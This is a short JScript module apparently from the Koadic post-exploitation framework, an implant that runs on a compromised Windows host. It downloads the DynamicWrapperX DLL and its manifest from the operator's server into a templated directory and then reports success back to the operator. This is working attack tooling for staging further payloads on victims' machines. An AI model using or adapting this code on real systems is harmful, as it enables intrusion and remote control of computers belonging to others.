try
{
    Koadic.http.download("~DIRECTORY~/dynwrapx.dll", "~DLLUUID~");
    Koadic.http.download("~DIRECTORY~/dynwrapx.manifest", "~MANIFESTUUID~");

    Koadic.work.report("Success");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
